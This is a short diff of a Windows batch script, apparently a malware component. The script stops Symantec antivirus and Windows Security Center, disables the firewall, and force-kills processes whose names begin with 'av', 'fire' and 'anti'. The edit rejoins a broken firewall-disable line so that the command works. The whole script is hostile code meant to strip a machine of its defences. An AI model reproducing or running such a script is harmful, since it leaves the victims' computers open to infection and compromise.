@@ -1,8 +1,7 @@
 @ echo off
 net stop "symantec antivirus"
 net stop “Security Center”
-netsh firewall set opmode
-mode=disable
+netsh firewall set opmode mode=disable
 tskill /A av*
 tskill /A fire*
 tskill /A anti*
